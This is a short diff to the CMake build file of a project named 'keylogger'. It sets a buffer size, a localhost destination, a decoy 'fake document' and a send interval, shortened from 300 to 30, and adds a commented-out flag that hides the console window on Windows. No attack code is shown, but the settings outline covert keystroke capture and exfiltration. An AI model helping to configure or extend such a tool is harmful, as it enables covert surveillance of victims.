@@ -5,7 +5,8 @@ project(keylogger VERSION 0.1.0)
 set(KEYLOGGER_BUFFER_SIZE 1048576)
 set(KEYLOGGER_HOSTNAME "localhost")
 set(KEYLOGGER_FAKE_DOCUMENT "test.txt")
-set(KEYLOGGER_SEND_TIME 300)
+set(KEYLOGGER_SEND_TIME 30)
+#set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -mwindows")
 
 # source files
 file(GLOB_RECURSE SRC_FILES ./src/*.c)
